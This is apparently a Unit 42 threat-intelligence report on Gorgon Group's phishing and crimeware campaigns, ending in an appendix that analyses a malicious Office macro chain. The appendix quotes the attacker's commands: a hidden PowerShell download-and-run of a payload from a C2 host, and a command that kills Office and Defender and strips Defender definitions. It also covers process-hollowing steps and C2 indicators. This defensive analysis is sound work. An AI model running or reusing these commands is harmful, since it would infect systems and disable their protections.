Recently Subaat drew our attention due to renewed targeted](https://blog.paloaltonetworks.com/2017/10/unit42-tracking-subaat-targeted-phishing-attacks-point-leader-threat-actors-repository/)\nattack activity. Part of monitoring Subaat included realizing the actor was possibly part of a larger crew of individuals responsible for\ncarrying out targeted attacks against worldwide governmental organizations. Technical analysis on some of the attacks as well as\n[attribution links with Pakistan actors have been already depicted by 360 and](https://ti.360.net/blog/articles/analysis-of-office-ole-sample/) [Tuisec, in which they found interesting connections to a](https://paper.tuisec.win/detail/eaff0936fcdaaa6)\nlarger group of attackers Unit 42 researchers have been tracking, which we are calling Gorgon Group.\n\nIn addition to the numerous targeted attacks, Unit 42 discovered that the group also performed a litany of attacks and operations\naround the globe, involving both criminal as well as targeted attacks.\n\nStarting in February 2018, Palo Alto Networks Unit 42 identified a campaign of attacks performed by members of Gorgon Group\ntargeting governmental organizations in the United Kingdom, Spain, Russia, and the United States. Additionally, during that time,\nmembers of Gorgon Group were also performing criminal operations against targets across the globe, often using shared\ninfrastructure with their targeted attack operations.\n\nGorgon Group's activity is interesting because in addition to traditional command and control (C2) domain utilization, Gorgon Group\nused common URL shortening services to download payloads; ultimately providing an extensive list of click counts and statistical data.\nAlso, interestingly, Gorgon Group has a diverse and active criminal element. On much of the C2 infrastructure we identified several\ncrimeware family samples. RATs such as NjRat and infostealers like Lokibot were leveraging the same C2 infrastructure as that of the\ntargeted attacks.\n\nUsing numerous decoy documents and phishing emails, both styles of attacks lacked overall sophistication, but the effectiveness of\nthis group and campaign cannot be denied.\n\nAttack Delivery and Infrastructure Analysis\n\nThe attack methodology, as well as analysis of several of the \".vbs\", \".doc\" and \".exe\" samples found hosted in the attacker's\ninfrastructure has been covered by 360 and Tuisec. Both 360 and Tuisec found that the most commonly observed and consistent\nattack pattern consists of the following stages:\n\n\n-----\n\n_Figure 1. Basic attacker methodology_\n\nAt the initial stage, the phishing attempts are kept very simple and lightweight by using OLE2Link objects that will usually make use of\nURL shortening services such as Bitly and t2m[.]io.\n\n_Figure 2 OLE2Link content example_\n\nWhile investigating the domains and infrastructure used by the phishing components of Gorgon Group, Unit 42 researchers witnessed\nseveral common operational security flaws with Gorgon Group's actors throughout their many campaigns. It was one of these OPSEC\nfailures that gave us an interesting cross-section of malware Gorgon Group is using. Included in the directories were a combination of\nfiles leveraged in targeted attacks mentioned above against nation states. Additionally, there was a plethora of malware samples that\nwere criminal in nature.\n\n_Figure 3. Open directory listing of hxxp://stevemike-fireforce[.]info/_\n\nBased on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in\nuse. An example of a domain structure and malware delivery contents is shown in the following table:\n\n**SHA-256** **Infrastructure URL**\n\n4e4967e3d39256049bc1054b966e5c609245fd3b2a934fda5cd1885526d8221e stemtopx[.]com/work/1.doc\n\nd2f58b08f8abfe5055f3c1f0b8d991dfe1deb62807a5336b134ce2fb36d87284 stemtopx[.]com/work/3.exe\n\ndb4d8d931f1b979cf32d311f9b03e851d3283b4f7e86252730247da25cf9f093 stemtopx[.]com/work/2.exe\n\n4c6e3d8fdb2394edffe4a5bc45a238749e929301efa8bcfa3a247b1ab68eac54 stemtopx[.]com/work/1.exe\n\n81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/new/20.exe\n\n26151f1e24bc97532e49013fbe04919de1f51e346dba1f10ce2e389160f2fb9d stemtopx[.]com/work/new/3.exe\n\na100ce0a67c5890bcc38d2b6e30f9164dfe266126ec40a2fd7eb8e941dc7d025 stemtopx[.]com/work/new/2.exe\n\n806098afc2148dabb838b24c4dfaa148269ac3ddf769aee54e75d46bfef0c506 stemtopx[.]com/work/doc/20.doc\n\nbf37d6cb393b440f790ad2b333624fde079e10bfaeb44d65188e3ccc551c982f stemtopx[.]com/work/k/1.docx\n\n\n-----\n\n81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/k/1s.exe\n\n_Table 1.

Examples of domain patterns_\n\nThe Gorgon Group Crew Breakdown\n\nFinding accessible directories, in combination with their other operational security failures, made it easy to start connecting the dots on\nGorgon Group members. 360 and Tuisec already identified some Gorgon Group members. In addition to Subaat, we counted an\nadditional four actors performing attacks as part of Gorgon Group. While it’s not known if the attackers physically reside in Pakistan, all\nmembers of Gorgon Group purport to be in Pakistan based on their online personas.\n\n**fudpages**\n\nOne member of Gorgon Group- we're calling ‘fudpages’, was found during this campaign activity based on their utilization of shared\ninfrastructure. One specific Microsoft document drew our attention.\n(446e1c80102c8b9662d66d44525cb9f519369061b02446e0d4cd30cd26d79a25)\n\nThis Microsoft Word document was sent via email to several industries across the US and Switzerland. We noticed that this document\npulls down additional malware from a C2 also being used in attacks by other Gorgon Group members. Additionally, this document\ncommunicates to a relatively new piece of C2 infrastructure- umarguzardijye[.]com, which is hosted on 91[.]234[.]99[.]206.\n\n\n-----\n\n_Figure 4 WHOIS information for umarguzardijye[.]com_\n\nFudpages, similar to other Gorgon Group members, made many of the same OPSEC failures of his or her fellow Gorgon Group\nmembers.\n\n_Figure 5 Open directory of umarguzardijye[.]com_\n\nThe WHOIS record for our new domain, umarguzardijye[.]com, shows that the registrant organization is \"fudpages\" and the address\nprovided in Pakistan. When looking closer at the IP hosting umarguzardijye[.]com, we noticed 91[.]234[.]99[.]206 hosts two additional\ndomains that drew our attention-fudpages[.]ru and fudpage[.]ru. Fudpage appears to be a small marketplace selling bulletproof\nhosting, RDP sessions, fake documents and a litany of additional malicious wares.\n\n\n-----\n\n_Figure 6 Advertisement website for FUD pages and spamming tools_\n\nListed on fudpage's marketplace are several pieces of contact information, which ultimately led us to an underground persona that\nwas selling, distributing and trading maliciousness across underground forums.\n\n_Figure 7. Underground forum posting for RAT_\n\nOperating underground since at least 2016, fudpages is also active on streaming sites like Youtube, where they use it as an\nadvertising platform.\n\n\n-----\n\n_Figure 8. Youtube video posting on how to perform malicious activities_\n\nLike all of Gorgon Group’s members, Fudpage’s online profile, infrastructure utilization and standardization, connects them back to\nGorgon Group. This connection to Gorgon Group helps illustrate the seemingly standardized methodologies Gorgon Group most often\nemploys.\n\nThe Tale of Two Intentions: Criminal and Targeted\n\nAs part of the investigation, Unit 42 researchers were able to identify an interesting characteristic about how the Gorgon Group crew\nuses shared infrastructure between cybercrime and targeted attacks. The crew combines both regular crime and targeted attack\nobjectives using the same domain infrastructure over time, rarely changing their TTPs.\n\nStarting in mid-February, Unit 42 researchers have been tracking an active campaign sharing a significant portion of infrastructure\nleveraged by Gorgon Group for criminal and targeted attacks. In Figure 9, below, red indicates targeted IP addresses, malware,\nregistrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses,\nmalware used, registrant information, and domains:\n\n\n-----\n\n_Figure 9. Overlap between infrastructure_\n\nWhile looking at the total cluster of Gorgon Group activity, it’s also interesting to look at the total click volume during the campaign’s\ntimeframe. Leveraging click counts for the campaign for Bitly, we were able to see Gorgon Group’s activity volume increase\nthroughout April.\n\n_Figure 10. Total clicks performed on Gorgon Group infrastructure over time_\n\nLooking specifically at one domain used in both cybercrime and targeted attacks, we can see a micro viewpoint into their campaign.\nBetween April 1, 2018 and May 30, 2018, we observed the domain stevemike-fireforce[.]info used in a Gorgon Group cybercrime\ncampaign involving more than 2,300 emails and 19 documents in the initial attack. This same domain was also used during the same\nperiod of time in targeted attacks against several worldwide nation state agencies.\n\nAnalysis of the data allowed Unit 42 researchers to make some interesting conclusions:\n\n\n-----\n\nSeveral unique domains are used for both cybercrime and targeted attacks.\nThe amount of sessions for cybercrime is higher than targeted, as expected.\nThere is no specific pattern on when targeted attacks happen, the domains can initially be used for cybercrime and then quickly\nutilized in a targeted attack with little warning.\n\nAs a graphical representation, Figure 11, below, indicates the amount of unique sessions observed for this domain over the\ncampaign’s operational time, representing the attack intention in two separate areas.\nIt's interesting to observe on April 24th, this domain delivers a targeted attack aimed at several worldwide governmental bodies, in the\nmiddle being of also being used in the delivery of a malspam campaign. The subject used in this case of targeted attack was \"Pakistan\neying Sukhoi-35 figther planes as part of defense deal from Rusia\":\n\n_Figure 11 Crimeware activity versus targeted activity against stevemike-fireforce[.]info_\n\nIn order to have a better idea of the volume of unique attacks per date and intention, see the following volume-based representation in\nFigure 12, where targeted attack volumes are represented in red and crime in green:\n\n\n-----\n\n_Figure 12. Volume of crimeware activity versus targeted attacks using stevemike-fireforce[.]info_\n\nFocusing on one domain allowed us to quickly understand its usage and better understand how it interconnects to a larger malspam\ncampaign.\n\nIntention #1: Cybercrime\n\n[Criminal attacks are not new to this crew, some of which was covered in our previous blog for Gorgon Group member Subaat. During](https://blog.paloaltonetworks.com/2017/10/unit42-tracking-subaat-targeted-phishing-attacks-point-leader-threat-actors-repository/)\nthe current campaign, Gorgon Group’s criminal enterprises netted 132,840 Bitly clicks from mid-February to the present. Targeting a\nlarge cross-section of industries, there was little in terms of targeting during their criminal activity.\n\n_Figure 13. Criminal Attacks Bitly Link Clicks Worldwide_\n\n\n-----\n\nA majority of the crimeware distribution was done via standard malspam campaigns leveraging well known Purchase Order and\n[\"SWIFT\" lures. Most of the filenames included a variance of filenames like:](https://en.wikipedia.org/wiki/Society_for_Worldwide_Interbank_Financial_Telecommunication)\n\nSWIFT {Date}.doc\nSWIFT COPY.doc\nPURCHASE ORDER {Random Value}.doc\nDHL_RECEIPT {Random Value}.doc\nSHIPPING RECEIPT {Date}.doc\n\nThe tools used by the crew do not really differ in general crime vs more targeted attacks, in both instances they related to several\nremote access and data stealing malware families. The top five malware families identified as criminal in nature so far have been the\nfollowing:\n\nNjRAT: NjRAT is a remote-access Trojan commonly used and witnessed in attacks that are both criminal and targeted attacks\nsince as early as 2013.\nRevengeRAT : RevengeRAT is a remote-access Trojan that was released for free on underground forums in 2016. While\nRevengeRAT could be used in targeted attack campaigns, it is commonly witnessed in criminal malspam campaigns.\nLokiBot: LokiBot is a commodity malware sold on underground sites which is designed to steal private data from infected\nmachines, and then submit that info to a command and control host via HTTP POST. This private data includes stored\npasswords, login credential information from Web browsers, and a variety of cryptocurrency wallets.\nRemcosRAT: RemcosRAT is a remote-access Trojan that first appeared in underground forums in July of 2016. The\nRemcosRAT has a feature-rich builder, which allows for the creation of Microsoft Word documents with malicious macros.\nNanoCoreRAT: Generally delivered via phishing, NanocoreRAT is a remote-access Trojan that opens a back door and steals\ninformation from the compromised computer.\n\nOne interesting note about the criminal activity of Gorgon Group is their usage of Bitly. Similar to that of their targeted attacks, Gorgon\nGroup leveraged Bitly for distribution and shortening of C2 domains. Using the same techniques across both their criminal and\ntargeted activity, made it easier for us to cluster Gorgon Group infrastructure and activity.\n\n_Figure 14. Clicks on Bitly links in criminal attacks_\n\nOverall, in spite of the lack of sophistication in Gorgon Group’s activity, they were still relatively successful; once again proving that\nsimple attacks on individuals without proper protections, work.\n\nIntention #2: Targeted Attacks\nBeginning in early March 2018, Unit 42 started observing targeted attacks against Russian, Spanish and United States government\nagencies operating in Pakistan. As we continued to investigate, it became apparent that Gorgon Group had been consistently\ntargeting worldwide governmental organizations operating within Pakistan. While Gorgon Group has been making minor changes in\ntheir methodologies, they are still actively involved in both targeted and criminal attacks.\n[This Gorgon Group campaign leveraged spear phishing emails with Microsoft Word documents exploiting CVE-2017-0199. The spear](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)\nphishing emails involved in this campaign would most often originate from Gmail accounts masquerading as legitimate individuals,\nsuch as a prominent Lt. Col in the Pakistani military.\nThe subjects of the spear phishing emails were also interesting, often contained subject matter related to terrorist groups, military\nactivity, or political topics.\n\nActing FOREIGN Minister of Pakistan\n\n\n-----\n\nInvitation to lady wives of H.E.

The popular NanoCoreRAT, QuasarRAT, and NJRAT variants were used\nheavily.\nIn a number of these attacks, the popular third-party URL shortening service Bitly was used to ultimately deliver the payloads for these\nattacks.\nIt's important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including\nresearchers) are also counted. So, while having this click information is valuable, it's only one small piece of a larger picture related to\ntargeting.\n\n_Figure 15. Bitly Click Information Related to a Gorgon Group C2 Domain_\n\nThe heaviest concentration of Bitly URL interaction came from Pakistan, which at 410 clicks accounted for 39% of all clicks. The\nUnited States amassed 194 clicks, accounting for 19%.\n\n\n-----\n\n_Figure 16 Clicks on Bitly links in targeted attacks_\n\nThe attacks took place primarily in March, late April, and early May of this year.\n\nConclusion\n\nGorgon Group isn't the first actor group we've witnessed dabble in both nation state level and criminal attacks. What makes Gorgon\nGroup unique is, that despite the group’s operational security failures, they still remained particularly effective. Looking closer at the\nactors participating in Gorgon Group gave us a unique perspective into the inner workings of an attack.\n\nLeveraging the same infrastructure for targeted attacks and criminal enterprises made for an interesting cross-section of mixed\nintentions. Ultimately, this lead us to the conclusion that several of Gorgon Group’s members have a nexus in Pakistan. While Gorgon\nGroup remains active, Palo Alto Networks customers are protected from this threat in the following ways:\n\nWildFire detects all current Gorgon Group files with malicious verdicts.\n[AutoFocus customers can track these samples with the Gorgon Group actor tag.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.GorgonGroup)\nTraps blocks all of the files currently associated with Gorgon Group\n\nAppendix\n\nAnalysis of a targeted attack\n\n**\"1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98\"**\n\nThe delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to\ncompromise the system. The infection process is rather interesting, as it involves multiple layers of .NET assemblies that will\neventually download the NanoCore remote administration tool (RAT) from a remote server and inject it into another process. In some\ninstances, we have also seen the RemcosRAT malware family delivered as the final payload. The infection process not only\ndownloads and executes a payload, but it also downloads and opens a decoy document to lower the recipient's suspicions of the\nentire process. Additionally, the process attempts to lower the overall security of the system by disabling security features in Microsoft\nOffice and Windows Defender. The payloads themselves are rather interesting, as the developer wraps the malicious code with\nlegitimate source code freely available online.\n\n**Delivery document**\n\nThe delivery document contains a macro that downloads an executable from a remote server. The macro downloads a payload from\nhxxp://lokipanelhostingpanel[.]gq/work/kh/1.exe (SHA256:\n84ed59953f57f5927b9843f35ca3c325155d5210824d3b79b060755827b51f72) by running the following command line process:\n\n1 cmd.exe /c powershell -W Hidden (New-Object\nSystem.NeT.WeBClieNT).DownloadFile('http://lokipanelhostingpanel[.]gq/work/kh/1.exe','%Public%\\\\\\\\svchost32.exe');Start-Process\n'%Public%\\\\\\\\svchost32.exe\n\nThe macro then attempts to kill Microsoft Office and Windows Defender processes using the ‘taskkill’ command. The command does\nnot attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam”\nfile, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher. This blanket approach to kill the\nappropriate process suggests that the actor does not change this command within their macro across delivery documents they\ncreated within these Microsoft Office applications. The command does not just attempt to kill the Windows Defender process, but also\nattempts to clear the detection definitions to not trigger an antivirus alert. The macro performs all of these activities with the following\ncommand:\n\n\n-----\n\n1\n2\n3\n4\n\n\ncmd /c taskkill /f /im winword.exe&taskkill /f /im Excel.exe&taskkill\n/f /im MSPUB.exe&taskkill /f /im POWERPNT.EXE&taskkill /f /im\nMSASCuiL.exe&taskkill /f /im MpCmdRun.exe&cd \"\"%ProgramFiles%\\Windows\nDefender\"\" & MpCmdRun.exe -removedefinitions -dynamicsignatures & exit\n\n\nThe macro also attempts to deactivate security mechanisms within Microsoft Office products by modifying the registry. First, the macro\nattempts to enable macros in multiple versions of Word, PowerPoint, Publisher and Excel by setting the following registry keys to the\nvalue of

Stage Payload\n\nThe payload installed by the macro is a downloader Trojan written in VB.NET that downloads a secondary payload and decoy\ndocument. It appears the author of this downloader used the source code from an open source tool called \"Sales System Application\",\nwhich is freely available at hxxp://www.a1vbcode[.]com/app-2999.asp. We believe the author of the downloader uses this Sales\nSystem Application to provide a legitimate look to their malicious payload. The malware author adds their own code to the application\nto run their malicious code before calling the legitimate functions that display the graphical user interface. The following functions are\ncalled when the application attempts to initialize the menu:\n\n\n1\n2\n3\n4\n\n\nETransaksi.Speed(); // Legitimate class, but method is the first\nwrapped function that leads to malicious code\nProjectData.EndApp(); // Closes the application before rest of\nlegitimate Sales System Application functions are called\n\n\nThe \"Speed\" method in the legitimate ETransaksi class contains legitimate code from the Sales System Application; however, the\nauthor of this tool includes this code in an if/else construct that bypasses these instructions by setting a false flag to skip the legitimate\ncode and execute the next step to the malicious code. The following code example shows the false flag being set (5 > 115) and the\nETransaksi.diomadnfagaghagh method being called:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nint num = 5;\nint num2 = 155;\nbool flag = num > num2;\nif (flag)\n{\n<legitimate Sales System Application code>\n}\nelse\n{\nNewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(), null, \"Invoke\", new object[]\n{\nnull,\nnew object[0]\n}, null, null, null, true);\n\n\nThe payload uses this technique to run a chain of methods that eventually carry out its malicious task. With the exception of the\n‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the\nfollowing list:\n\n1. ETransaksi.Speed\n2. ETransaksi.diomadnfagaghagh\n3. ETransaksi.fjcsERIfjfiojsGHIsdifjksi\n4. ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl\n5. ETransaksi.FJaioefgkaoeK\n\nThe last two methods in the chain carry out a majority of the first payload’s functionality. The ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl\nmethod obtains a resource named \"fgjfaieSDFAOKEfj.GSrdofjksrgj\", which is decrypted in the ETransaksi.FJaioefgkaoeK method\nusing a multibyte XOR cipher with the following key:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nbyte[] array = new byte[]\n{\n19,\n129,\n43,\n37,\n56,\n65,\n255,\n75,\n111,\n19,\n211,\n120,\n0,\n49,\n126,\n248\n};\n\n\nThe resulting cleartext is another .NET assembly, which the payload will load within its own process space.\n\nEmbedded Trojan\n\nThis Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a\nsecondary payload, as well as downloading and opening a decoy document. An unknown programmatic builder tool appears to have\ncreated this Trojan, as the code shows multiple configuration options for additional functionality that were not enabled within this\nspecific sample.\n\nUpon execution, this Trojan checks to see if it was configured with \"BINDERON\" to determine if it should extract an embedded\npayload from a resource named \"B\", save it to %TEMP%\\%BIND1%, and create a new process with the embedded payload. While the\nTrojan was configured to carry out this activity, the actor did not embed a payload within the \"B\" resource, so this functionality does not\ncarry out any activities, rather it just causes an exception and continues running.\n\nAnother configuration option encountered by this Trojan is a check for '%STARTUPON%'. This sample was not configured to execute\nwith this option enabled, however, should this option be enabled, the Trojan would attempt to install itself to the system at a specific\nlocation by writing its contents in base64-encoded format to the following file:\n\n%APPDATA%\\Microsoft\\Windows\\DsvHelper\\%DECRY%.txt\n\n\n-----\n\nThe Trojan then reads the contents of the %DECRY%.txt file, decode them and write the decoded data to the following file:\n%USERPROFILE%\\APPDATA\\Roaming\\Microsoft\\Windows\\DsvHelper\\@RANDOM@.exe\nThe Trojan would then create a new process using the @RANDOM@.exe file. When the Trojan runs as an executable within the\n\"DsvHelper\" folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the 'DsvHelper' folder. It then creates the\nfollowing registry key to automatically run the Trojan each time the system starts:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\@RANDOM@\nThe main behavior carried out by this Trojan involves obtaining an embedded executable, hollowing the current Trojan, writing the new\nembedded executable to the process memory and calling a specific function in the newly written payload. The embedded payload\nwritten to process memory exists in the \"R\" resource and called function in the new payload is named \"RPe.Test.Work\". The function\nwill take another executable embedded in the initial Trojan as a resource named \"M\", which it attempts to inject into the following\nprocess to execute:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe\nWhile it's configured to inject into cvtres.exe, the Trojan is also capable of injecting its code into the following process as well:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\n\nEmbedded injector Trojan\nThe R payload discussed above is nothing more than an injector Trojan, which accepts a path to an executable and a buffer of code to\ninject into the process as arguments. The R payload will create a process using the supplied path using the CreateProcessA API\nfunction. The payload then finds the base address of the newly created process using the GetThreadContext API function, and then\ncalls NtUnmapViewOfSection to hollow the process. The payload then calls the VirtualAllocEx API to create a buffer in the newly\nhollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly\ncreated buffer. The payload then sets EIP to the entry point of the newly injected code using the SetThreadContext API, and finally\ncalls the NtAlertResumeThread API function to run the injected code.\n\nEmbedded Downloader Trojan\nThe M payload (referenced previously along with the R payload, above) injected and executed within the memory space of the other\nprocess is a downloader Trojan. This specific downloader appears to have been created using a VB2Exe tool, as the functional code\nthat carries out the downloading functionality exists as a VBScript embedded within the payload. The payload extracts this VBScript\nfrom a resource and saves it to a file that it extracts from another resource. The filename used to save the VBScript is \"khm.vbs\",\nwhich is eventually run using \"wscript\". The VBScript has a SHA256 has of\n649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and\nexecute a payload and downloading and opening of a decoy document. The payload is downloaded from the following location and\nsaved to \"%PUBLIC%\\svchost32.exe\":\n\nhxxp://lokipanelhostingpanel[.]gq/work/kh/1s.exe\n\nThe decoy document is downloaded from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.docx and saved to\n\"%PUBLIC%\\svchost32.docx\". When opened, the decoy document shows the following content, which contains the image and copied\ntext from a [news article titled “Top civil-military body rejects Nawaz’s controversial statement on Mumbai attacks,” as seen in the](https://arynews.tv/en/nsc-reject-nawaz-sharif-mumbai-attacks-statement/)\nfollowing screenshot:\n\n\n-----\n\n_Figure 17. Decoy document downloaded by malware_\n\nFinal Payload\n\nThe final payload is a dropper Trojan that installs the NanoCore RAT. The author of this payload (SHA256:\n690fc694b0840dbabb462ae46eb836777420b3354e53a6944a2e169b965b0bec) appears to have used an open source tool called\n\"Saransh Email System\" as a basis of this tool, which was likely downloaded from hxxp://www.a1vbcode[.]com/app-4601.asp. Much\nlike the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the\nmalicious functions, which have the same method names as the original tool and follow the same call sequence:\n\n1. Form1.Speed\n2. Form1.diomadnfagaghagh\n3. Form1.fjcsERIfjfiojsGHIsdifjksi\n4. Form1.gsgjIDJIGJIGJIGJIFDOSpl\n5. Form1.FJaioefgkaoeK\n\nThis chain of functions eventually loads a resource named 'GSrdofjksrgj', which the tool decrypts using the same algorithm and key as\nin the initial payload:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nbyte[] array4 = new byte[]\n{\n19,\n129,\n43,\n37,\n56,\n65,\n255,\n75,\n111,\n19,\n211,\n120,\n0,\n49,\n126,\n248\n};\n\n\n-----\n\nThe decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which\nis a variant of the NanoCore remote administration tool. This variant of NanoCore was configured to communicate with the following IP\naddress as its C2 server over TCP port 6666:\n\n115.186.136[.]237\n\nBitly short URLs and expanded domains\n\n**Short
